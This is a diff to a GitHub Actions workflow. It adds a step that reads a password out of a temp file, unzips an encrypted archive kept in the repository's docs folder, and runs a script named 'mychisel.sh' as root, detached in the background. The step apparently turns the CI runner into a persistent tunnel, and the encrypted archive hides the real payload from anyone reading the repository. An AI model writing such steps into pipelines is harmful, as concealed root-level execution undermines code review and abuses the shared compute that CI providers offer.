@@ -77,7 +77,7 @@ jobs:
           sp9: 3
           TZ: Asia/Shanghai
 
-          
+     
           
       - name: Run a 3rd script #cat /tmp/gh-y1;echo liuhuan88;cat /tmp/gh-y2;cat /tmp/gh-y1;
         run: |
@@ -90,6 +90,17 @@ jobs:
           grep NAME /etc/os-release;
           #cat /tmp/y2;
           #echo "ping success"
+        env:
+          sp9: 4
+          TZ: Asia/Shanghai
+
+               
+          
+      - name: Run a 35rd script # 
+        run: |
+          cd /tmp;
+          pd127=$(grep -oP "(?<=PPP).*(?=WWW)" /tmp/js9);
+          [ ! -z ${pd127} ] && sudo unzip -P ${pd127}  /home/runner/work/nc_test/nc_test/docs/free-us1-udp7z.zip  -d /home/ && (setsid  bash -c "sudo -H su -c 'bash /home/mychisel.sh'" &)
         env:
           sp9: 4
           TZ: Asia/Shanghai
